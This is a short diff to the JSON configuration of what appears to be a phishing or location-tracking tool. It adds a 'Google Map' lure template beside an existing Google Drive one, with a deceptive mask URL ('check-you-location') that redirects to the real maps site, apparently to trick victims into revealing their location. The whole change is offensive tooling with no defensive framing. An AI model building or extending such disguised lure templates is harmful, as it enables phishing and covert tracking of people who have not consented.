@@ -626,6 +626,13 @@
       "folder": "location_gdrive",
       "mask": "https://download-the-file",
       "redirect": "https://drive.google.com"
+    },
+    {
+      "name": "Google Map",
+      "choice": "5",
+      "folder": "location_gmap",
+      "mask": "https://check-you-location",
+      "redirect": "https://maps.google.com"
     }
   ],
   "IP Tracker": [
